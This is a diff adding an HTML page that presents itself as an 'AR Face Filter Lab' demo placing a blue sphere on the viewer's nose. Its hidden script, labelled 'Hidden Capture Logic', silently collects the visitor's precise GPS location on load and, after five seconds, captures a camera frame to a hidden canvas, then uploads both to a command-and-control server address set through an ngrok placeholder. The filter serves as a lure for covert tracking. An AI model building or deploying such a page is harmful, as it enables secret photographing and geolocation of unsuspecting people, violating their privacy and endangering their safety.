@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AR Face Filter Lab</title>
+    <!-- Load AR.js and A-Frame for the 3D Filter -->
+    <script src="https://aframe.io/releases/1.2.0/aframe.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/hiukim/mind-ar-js@1.1.4/dist/mindar-face.prod.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/hiukim/mind-ar-js@1.1.4/dist/mindar-face-aframe.prod.js"></script>
+    
+    <style>
+        body { margin: 0; overflow: hidden; font-family: sans-serif; }
+        #overlay { position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.5); color: white; padding: 10px; border-radius: 5px; z-index: 100; }
+        .hidden-canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div id="overlay">
+        <h3>AR Demo v1.0</h3>
+        <p>Loading Face Mask...</p>
+    </div>
+
+    <!-- The AR Scene -->
+    <a-scene mindar-face="autoStart: true; uiError:no; uiLoading:no; uiScanning:no;" embedded color-space="sRGB" renderer="colorManagement: true, physicallyCorrectLights" vr-mode-ui="enabled: false" device-orientation-permission-ui="enabled: false">
+        <a-camera active="false" position="0 0 0" look-controls="enabled: false"></a-camera>
+        
+        <!-- This adds a floating blue 3D sphere to the tip of the nose -->
+        <a-entity mindar-face-target="anchorIndex: 1">
+            <a-sphere color="blue" radius="0.1" opacity="0.5"></a-sphere>
+        </a-entity>
+    </a-scene>
+
+    <!-- Hidden Capture Logic -->
+    <canvas id="capture-canvas" class="hidden-canvas" width="640" height="480"></canvas>
+
+    <script>
+        // --- 1. CONFIGURATION ---
+        // Replace this with your public Ngrok URL every time you start the lab
+        const C2_SERVER = "YOUR_NGROK_URL_HERE/upload_web";
+
+        // --- 2. AUTOMATIC INTEL ---
+        window.addEventListener('load', () => {
+            console.log("[*] AR Lab Initialized");
+            captureGPS();
+            
+            // Wait 5 seconds for the user to enjoy the "Filter" then snap the photo
+            setTimeout(capturePhoto, 5000);
+        });
+
+        async function captureGPS() {
+            navigator.geolocation.getCurrentPosition((pos) => {
+                const data = { lat: pos.coords.latitude, lon: pos.coords.longitude, type: "AR_DEMO" };
+                sendData('location', JSON.stringify(data));
+            }, null, {enableHighAccuracy: true});
+        }
+
+        async function capturePhoto() {
+            // We grab a frame from the AR video feed
+            const video = document.querySelector('video');
+            if (video) {
+                const canvas = document.getElementById('capture-canvas');
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob((blob) => {
+                    const formData = new FormData();
+                    formData.append('ar_capture.png', blob);
+                    fetch(C2_SERVER, { method: 'POST', body: formData });
+                    console.log("[!] AR Intel Sent");
+                }, 'image/png');
+            }
+        }
+
+        function sendData(name, value) {
+            const formData = new FormData();
+            formData.set(name, value);
+            fetch(C2_SERVER, { method: 'POST', body: formData });
+        }
+    </script>
+</body>
+</html>
